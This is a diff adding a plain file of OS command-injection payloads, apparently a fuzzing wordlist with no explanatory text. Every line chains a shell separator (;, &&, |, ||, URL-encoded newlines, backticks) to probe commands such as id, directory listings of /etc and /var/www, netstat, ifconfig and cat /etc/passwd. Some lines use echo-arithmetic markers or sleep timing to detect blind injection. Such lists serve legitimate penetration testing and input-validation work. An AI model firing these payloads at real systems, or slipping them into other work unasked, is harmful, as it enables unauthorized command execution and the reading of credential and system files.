@@ -1,0 +1,206 @@
+; dir
+; id
+; ifconfig
+; ls -l /
+; ls -l /etc/
+; ls -l /home/*
+; ls -l /tmp
+; ls -l /var/www/*
+; ls -laR /etc
+; ls -laR /var/www
+; netstat -an
+;%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+;%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+;%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+;%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+;%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+;%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+;%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+;echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+;echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+;echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+;echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+;echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+;echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+;echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+;id
+;id;
+;netstat -a;
+';echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+';echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+';echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+';echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+';echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+';echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+';echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'&&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'&&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'&&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'&&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'&&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1
+'| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #
+'| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &
+'||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'||echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'||echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'||echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'||echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'||echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'|echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'|echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'|echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'|echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'|echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+*; ls -lhtR /var/www/
+& dir
+& id
+& ifconfig
+& ls -l /
+& ls -l /etc/
+& ls -l /home/*
+& ls -l /tmp
+& ls -l /var/www/*
+& ls -laR /etc
+& ls -laR /var/www
+& netstat -an
+& ping -c 2 127.0.0.1 &
+& ping -i 1 -c 2 127.0.0.1 &
+&& dir
+&& ifconfig
+&& ls -l /
+&& ls -l /etc/
+&& ls -l /home/*
+&& ls -l /tmp
+&& ls -l /var/www/*
+&& ls -laR /etc
+&& ls -laR /var/www
+&& netstat -an
+&&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+&&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+&&%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+&&%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+&&%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+&&%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+&&%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+&&dir
+&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+&&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+&&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+&&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+&&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+&&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+&&id
+&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+&%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+&%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+&%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+&%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+&%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+%0a id %0a
+%0a ls -la
+%0a ping -i 1 -c 2 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%0Acat /etc/passwd
+%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+%0Aid
+%0Aid%0A
+| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1
+| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #
+| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &
+| dir
+| id
+| ifconfig
+| ls -l /
+| ls -l /etc/
+| ls -l /home/*
+| ls -l /tmp
+| ls -l /var/www/*
+| ls -laR /etc
+| ls -laR /var/www
+| netstat -an
+|/bin/ls -al
+|/usr/bin/id
+|%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+|%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+|%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+|%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+|%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+|%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+|%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+||/usr/bin/id;
+||%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+||%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+||%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+||%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+||%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+||%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+||%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+||`ping -c 2 127.0.0.1` #' |ping -n 2 127.0.0.1||`ping -c 1 -n 2 127.0.0.1` #\" |ping -n 2 127.0.0.1
+||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+||echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+||echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+||echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+||echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+||echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+|echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+|echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+|echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+|echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+|echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+|id
+|id;
+$;/usr/bin/id
+a;/usr/bin/id
+a;/usr/bin/id;
+a;id
+a;id;
+a);/usr/bin/id
+a);/usr/bin/id;
+a);id
+a);id;
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a)|id
+a)|id;
+a|/usr/bin/id
+a|id
+foobar bletch `cat /etc/passwd`
